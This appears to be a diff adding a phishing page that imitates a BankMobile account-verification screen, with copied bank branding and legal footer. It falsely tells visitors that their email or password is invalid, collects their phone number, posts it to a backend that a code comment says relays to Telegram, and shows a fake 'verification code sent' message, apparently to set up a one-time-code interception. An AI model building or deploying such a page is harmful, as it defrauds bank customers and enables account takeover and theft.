@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification - BankMobile</title>
+    <link rel="icon" type="image/x-icon" href="https://pub.mini-tools.uk/30-day/4ec7179d-efb7-4136-8c8f-eff783f16616.jpg">
+    <link rel="shortcut icon" type="image/png" href="logo.png">
+    <style>
+        body {
+            background-color: #ffffff;
+            font-family: Arial, sans-serif;
+            color: #333;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .top-line {
+            width: 80%;
+            height: 1px;
+            background-color: #003366;
+            margin-top: 50px;
+        }
+
+        .verification-container {
+            border: 2px solid #003366;
+            border-radius: 8px;
+            padding: 40px;
+            max-width: 600px;
+            width: 90%;
+            text-align: center;
+            margin-top: 40px;
+            background-color: #fff;
+        }
+
+        /* Padlock icon - light baby blue padlock SVG */
+        .icon-box {
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .icon-box svg {
+            width: 56px;
+            height: 56px;
+        }
+
+        .icon-box svg path {
+            fill: #89CFF0;
+        }
+
+        .message {
+            font-size: 16px;
+            line-height: 1.4;
+            margin-bottom: 25px;
+            font-weight: bold;
+            color: #444;
+        }
+
+        .phone-input-section {
+            border: 1px solid #ccc;
+            padding: 15px;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        input[type="tel"] {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            width: 250px;
+            font-size: 16px;
+        }
+
+        .fine-print {
+            font-style: italic;
+            font-size: 13px;
+            color: #666;
+            margin: 15px 0;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .btn {
+            padding: 12px 30px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 2px;
+            text-decoration: none;
+            border: 1px solid #000;
+            background: #fff;
+            color: #000;
+        }
+
+        .btn:hover {
+            background-color: #f5f5f5;
+        }
+
+        /* ========== FOOTER STYLES (MATCHING BANKMOBILE PAGE) ========== */
+        .footer-separator { 
+            border-top: 1.5px solid #e0e0e0; 
+            width: 95%; 
+            margin: 80px auto 30px auto; 
+        }
+        
+        footer { 
+            text-align: center; 
+            padding: 0 20px 80px 20px; 
+            color: #000; 
+            background: #fff; 
+            width: 100%;
+        }
+        
+        .footer-nav { 
+            font-size: 11px; 
+            margin-bottom: 25px; 
+            font-weight: bold; 
+        }
+        
+        .footer-nav a { 
+            color: #000; 
+            text-decoration: underline; 
+            margin: 0 5px; 
+        }
+        
+        .partner-logos { 
+            margin-bottom: 30px; 
+        }
+        
+        .partner-logos img { 
+            height: 50px;
+            object-fit: contain;
+        }
+        
+        .legal-footer { 
+            max-width: 950px; 
+            margin: 0 auto; 
+            font-size: 10.5px; 
+            line-height: 1.6; 
+            color: #333; 
+        }
+        
+        @media (max-width: 768px) {
+            .verification-container {
+                padding: 25px;
+            }
+            .phone-input-section {
+                flex-direction: column;
+            }
+            .footer-nav a {
+                display: inline-block;
+                margin: 3px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="top-line"></div>
+
+    <div class="verification-container">
+        <div class="icon-box">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+            </svg>
+        </div>
+        
+        <div class="message">
+            The email/password you entered is invalid. <br>
+            Please submit your registered phone number to help verify your identity and secure your account.
+        </div>
+
+        <div class="phone-input-section">
+            <label for="phone">Phone Number:</label>
+            <input type="tel" id="phone" placeholder="(***) ***-****" maxlength="14" required>
+        </div>
+
+        <p class="fine-print">† Message and data rates may apply. 1 message/request.</p>
+
+        <p style="font-size: 14px; color: #555;">
+            Once you submit your number, you will receive a secure code <br>
+            to access your account.
+        </p>
+
+        <div class="button-group">
+            <button class="btn" onclick="goBack()">Go Back</button>
+            <button class="btn" onclick="submitPhone()">Continue</button>
+        </div>
+    </div>
+
+    <!-- ========== FOOTER MATCHING BANKMOBILE PAGE ========== -->
+    <div class="footer-separator"></div>
+
+    <footer>
+        <div class="footer-nav">
+            <a href="#">Home</a> | <a href="#">Security</a> | <a href="#">Fee Schedules</a> | <a href="#">Terms and Conditions</a> | <a href="#">Privacy Statement</a> | <a href="#">Privacy Notice for California Residents</a> | <a href="#">Contact Us</a> | <a href="#">Identity Verification</a> | <a href="#">FAQs</a>
+        </div>
+        <div class="partner-logos">
+            <img src="https://pub.mini-tools.uk/30-day/db986403-4750-45d2-a56b-c211625ed653.png" alt="First Carolina Bank | BM Technologies" style="height: 50px;">
+        </div>
+        <div class="legal-footer">
+            <p><strong>© 2026 Powered by BM Technologies, Inc., a wholly owned subsidiary of First Carolina Bank, Member FDIC and Equal Housing Lender. All Rights Reserved.</strong></p>
+            <br>
+            <p>BankMobile banking products and banking services are provided by First Carolina Bank, Member FDIC & Equal Housing Lender. The BankMobile Debit Mastercard® card is issued and administered by First Carolina Bank pursuant to license from Mastercard International Incorporated. Mastercard and the Mastercard brand mark are registered trademarks of Mastercard International Incorporated. All other names and logos are owned by their respective owners.</p>
+            <br>
+            <p><strong>BM Technologies, Inc., 171 North Winstead Avenue, Rocky Mount, NC 27804</strong></p>
+        </div>
+    </footer>
+
+    <script>
+        // US Phone number formatting and validation
+        const phoneInput = document.getElementById('phone');
+        
+        // Format phone number as user types (US format)
+        phoneInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove all non-digits
+            let formattedValue = '';
+            
+            // Limit to 10 digits (US number)
+            if (value.length > 10) {
+                value = value.slice(0, 10);
+            }
+            
+            // Format as (XXX) XXX-XXXX
+            if (value.length > 0) {
+                formattedValue = '(' + value.slice(0, 3);
+                if (value.length >= 4) {
+                    formattedValue += ') ' + value.slice(3, 6);
+                }
+                if (value.length >= 7) {
+                    formattedValue += '-' + value.slice(6, 10);
+                }
+                e.target.value = formattedValue;
+            } else {
+                e.target.value = '';
+            }
+        });
+        
+        // Prevent non-digit key presses
+        phoneInput.addEventListener('keydown', function(e) {
+            // Allow: backspace, delete, tab, escape, enter, home, end, left, right, arrow keys
+            if (e.keyCode === 8 || e.keyCode === 46 || e.keyCode === 9 || e.keyCode === 27 || 
+                e.keyCode === 13 || e.keyCode === 35 || e.keyCode === 36 || e.keyCode === 37 || 
+                e.keyCode === 38 || e.keyCode === 39 || e.keyCode === 40) {
+                return;
+            }
+            // Allow Ctrl+A, Ctrl+C, Ctrl+V, Ctrl+X
+            if ((e.ctrlKey === true || e.metaKey === true) && (e.keyCode === 65 || e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 88)) {
+                return;
+            }
+            // Allow only digits
+            if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
+                e.preventDefault();
+            }
+        });
+        
+        function validateUSPhone(phone) {
+            // Remove all non-digits
+            const digits = phone.replace(/\D/g, '');
+            // US phone must be exactly 10 digits
+            return digits.length === 10;
+        }
+        
+        async function submitPhone() {
+            let phone = document.getElementById('phone').value.trim();
+            
+            if (!phone) {
+                alert('Please enter your phone number.');
+                return;
+            }
+            
+            // Validate US phone number (exactly 10 digits)
+            const digits = phone.replace(/\D/g, '');
+            if (digits.length !== 10) {
+                alert('Please enter a valid 10-digit US phone number (e.g., (555) 123-4567).');
+                return;
+            }
+            
+            // Send phone to backend/Telegram
+            try {
+                await fetch('/submit-phone', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: digits })
+                });
+            } catch (e) {
+                console.error('Error submitting phone:', e);
+            }
+            
+            alert('Verification code sent to your phone.');
+        }
+        
+        function goBack() {
+            window.history.back();
+        }
+        
+        // Allow Enter key to submit
+        phoneInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                submitPhone();
+            }
+        });
+    </script>
+</body>
+</html>
